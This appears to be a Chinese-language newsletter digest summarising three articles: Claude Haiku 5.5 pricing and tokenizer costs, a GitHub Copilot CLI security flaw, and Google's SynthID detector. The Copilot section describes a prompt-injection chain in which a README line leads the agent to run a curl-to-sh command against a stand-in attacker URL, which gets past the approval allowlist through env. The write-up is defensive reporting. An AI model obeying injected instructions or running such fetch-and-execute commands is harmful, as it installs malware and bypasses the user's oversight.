强烈推荐——今晚最该读的一篇 · ★★★★★ · TLDR

Claude Haiku 5.5

为什么值得看：把 Haiku 5.5 的定价拐点、分词器多算 token、推理档位实测和订阅转 API 额度一次讲全：≤10 万 token 场景与 GPT-6 Luna 同价且基准更高，过线则 Luna 更划算。

展开完整精读

一句话判断

Haiku 5.5 把 Anthropic 的廉价档位一次拉到与 GPT-6 Luna 同价，但真正要记住的是三个细节：超过 10 万 token 后涨价 5 倍、新分词器让同一段 prompt 多算约 25% 的 token、以及订阅用户每月开始收到可观的 API 额度——这一篇把「哪类负载放哪家、成本怎么算」讲透了。

1. 定价：对齐 GPT-6 Luna，但拐点差了三倍

Haiku 5.5 定价 $0.10 / $0.50 每百万 token（输入/输出），10 万 token 以内与 GPT-6 Luna 完全一致；超过 10 万后涨到 $0.50 / $2.50，而 Luna 的涨价拐点在 27.2 万 token、且只涨到 $0.20 / $0.75。作者的结论很直接：10 万 token 以内的负载，Haiku 同价且基准分更高；一旦过线，Luna 明显更划算。对比前代，Haiku 4.5 是一年前发布的 $1 / $5，当时就比 GPT-6 Luna 贵 10 倍——这次相当于把廉价档整个重做了一遍。

2. 隐藏成本：新分词器让同一 prompt 多算 1.25x token

Haiku 5.5 换了一个更「吃 token」的分词口径。用 Simon 的 Claude Token Counter 实测，同一段长 prompt 在 Haiku 5.5 上比 Haiku 4.5 多算约 1.25x 的 token。名义单价降了，账要连着 token 一起算——这里藏着约 25% 的隐性成本，做成本模型时不能只对比单价。

3. 实测与推理档位：不能关推理，默认 medium

新 Haiku 不允许关掉推理，默认 medium 档。作者用「骑自行车的鹈鹕」生成 SVG 做基准：low 档 7 秒、0.0936 美分；max 档跑了 5 分 9 秒、3.3826 美分（相比一年前 Haiku 4.5 同题 0.7583 美分、画得很糟）。对高吞吐场景的含义：延迟与费用的方差变大，别默认「快模型=低延迟」。

4. 配套动作：Sonnet 缓存半价 + 订阅送 API 额度

同一天 Anthropic 还宣布：Sonnet 5.5 的缓存读取价格减半；Max/Team 订阅开始每月送 API 额度——Max 5x 每月 $100、Max 20x 每月 $200、Team 最高 $500 池化共享。额度不结转（用不掉就作废），可以关闭自动充值（余额用尽即停止请求，避免意外账单）。额度与订阅费基本等值，对「订阅了但还想用 API」的用户相当友好。

5. 对选型的实际影响

  • 10 万 token 以内的批量任务（摘要、分类、客服、结构化抽取）：Haiku 5.5 直接进入第一梯队，与 Luna 按量比价即可；
  • 长上下文负载：先算 token 再算钱，注意 1.25x 的分词系数与 10 万拐点——大输入场景 Luna 优势明显；
  • 成本治理：订阅送额度 + 可关自动充值把「订阅跑 API」的路径补平了不少，但记得额度不用即失效。

我的推荐

Simon 的发布分析一贯是「今天就能用上的信息」：精确到美分的实测、分词器的坑、两条价格线的拐点，全在一篇里。如果你的产品线有任何一个批量推理负载，今晚就该拿一段真实 prompt 去跑一遍 token 计数，重算月度成本。

强烈推荐——所有用编码代理的人都该读 · ★★★★☆ · TLDR InfoSec

GitHub Copilot CLI Downloads and Executes Malware

为什么值得看：一条可复现、零交互的完整攻击链：README 一行注入 → env 绕过只读清单 → 无批准下载执行恶意软件；GitHub 关闭报告后，同类绕过还有未公开变体。

展开完整精读

一句话判断

一次教科书级的「校验器信任边界」失败：Copilot CLI 的批准系统按命令名匹配，而 env 在内置只读清单里、curl 和 sh 只是它的参数——于是仓库 README 里的一行文本就能让代理不经批准下载并执行恶意软件。GitHub 的反应同样值得读：判定为「已知问题、不构成重大安全风险」并关闭了报告。

1. 背景：人在回路的批准系统

Copilot CLI 宣称敏感命令（如 curl、sh）执行前需要用户批准，外部 URL 访问（curl / wget / 内置 web-fetch）也有独立检查。只有三种情况无需批准：用户显式配置自动执行、开启 yolo 模式、或命令命中内置的「只读」清单。研究者先验证防线是活的：让代理跑 curl example.com，确实弹出了批准请求。

2. 绕过：一条命令，零交互

载荷是：env curl -s "https://[ATTACKER_URL].com/bugbot" | env sh。env 命中内置只读清单被自动放行；curl 与 sh 作为 env 的参数、不处于命令位置，命令校验器与「URL 权限」的正则都没有识别出来——外部 URL 检查根本没有触发。结果是无需任何人工确认，恶意软件被下载并执行。

3. 攻击链与注入面

典型场景：用户克隆一个开源仓库、让 Copilot 帮忙看代码 → 注入指令藏在 README（不可信内容）里 → 代理执行上述命令。文章强调注入面远不止 README：网页搜索结果、MCP 工具返回、终端输出都可能是投递通道。攻击打的是「用户对代理的信任」本身。

4. 厂商响应与现状

GitHub 在报告提交次日关闭：认定是已知问题、不构成重大安全风险，未进入修复与赏金流程。研究者注明：文中演示的命令解析问题是 macOS 特有的；此外还存在未公开的跨平台与 Windows 专属解析问题、以及可导致任意文件读写的漏洞——修复前不公开细节。作者给出的 --deny-tool 'shell(env)' 之类参数只能挡已知手法，覆盖不了全部绕过。

5. 对实际工程的意义

  • 自研代理 harness 的校验器别按「命令名白名单」做安全判断——要看解析后的语法结构（shell 里 env、xargs、sudo 都能把危险命令藏在参数里）；
  • 把仓库 / 网页 / MCP 返回的内容一律当不可信输入：只读清单、自动批准与 yolo 模式叠加起来就是无批准执行；
  • 跑编码代理时加一层沙箱（容器 / VM、无凭据环境、出站白名单），这是对这类绕过最有效的兜底；
  • 给工具面做减法：不需要 shell 的会话就不给 shell。

我的推荐

如果你每天在用编码代理（Copilot CLI、Claude Code、Codex 都属于同一类架构），这篇值得完整读一遍：命令怎么藏、批准为什么没触发、厂商为什么不修，三步都讲清楚了。读完顺手检查自己代理的沙箱与凭据暴露面，收益比大多数安全文章都直接。

Google Expands SynthID Detector Globally

为什么值得看：内容溯源工具箱里最实用的一环全球开放：1800 亿份媒体的水印规模、OpenAI / NVIDIA 互认、日均百万级请求——媒体与 UGC 产品可以直接把检测接进流程。

展开完整精读

一句话判断

内容溯源迈出「全民可用」的一步：SynthID 检测器全球开放（英文），任何人可上传图片 / 视频 / 音频检测 Google 及合作方嵌入的不可见水印。用法简单，但边界要清楚——它证明的是「出自参与方模型」，而不是「是否为 AI 生成」。

1. 是什么

Google 把此前仅面向媒体专业人士的 SynthID Detector 扩展为全球可用的独立平台（synthid.com）：检查文件里是否带有 Google 或合作方 AI 生成的不可见水印。自 2023 年发布以来，SynthID 已为超过 1800 亿张图片 / 视频和 24 万年的音频内容嵌入水印。

2. 生态：水印互认

检测覆盖的合作方包括 OpenAI、NVIDIA、Kakao，Apple 即将接入。跨厂商的水印互认是内容溯源的关键一步——单一厂商的检测器价值有限，多家互认才能成为行业基础设施。

3. 验证能力已经铺开

SynthID 的验证功能已内建在 Search、Gemini 应用与 Chrome 中，目前每天处理超过 100 万次请求；独立检测器上线后，普通用户不再依赖这些入口，直接上传文件即可。

4. 边界与误用

检测为阴性不等于内容非 AI：它只认参与方的水印。对发布 / 采购流程来说，适合作为「溯源信号之一」（配合 C2PA、来源记录）而不是唯一裁判；对伪造者而言绕过水印并非零成本，但也别假设全行业都已接入。

5. 对实际工程的意义

  • 媒体 / UGC 产品：可以把水印检测接进素材进厂检查的一环；
  • 内部合规：Google AI 生成的素材现在有明确的验证路径，可以写进 SOP；
  • 自建生成管线：如果需要对产出做溯源标记，值得关注 SynthID 与合作方水印的开放程度与前向兼容。

我的推荐

两分钟能读完的一篇公告，但信息密度不低：1800 亿的规模数字、OpenAI / NVIDIA 的水印互认、日均 100 万次请求，说明内容溯源正在从「实验室功能」变成基础设施。做内容产品的读者值得读，顺手上 synthid.com 传一张自己的 AI 图片试试。
